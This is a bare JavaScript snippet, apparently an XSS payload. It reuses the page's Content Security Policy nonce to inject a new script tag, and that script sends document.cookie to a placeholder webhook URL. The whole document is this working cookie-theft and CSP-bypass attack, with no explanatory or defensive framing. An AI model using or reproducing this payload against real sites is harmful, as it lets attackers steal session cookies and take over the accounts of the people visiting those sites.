const nonce = document.currentScript.nonce;
const newHTML = `
  <script nonce="${nonce}">
    fetch('https://your-webhook.site/path?c=' + document.cookie);
  <\/script>
`;
document.write(newHTML);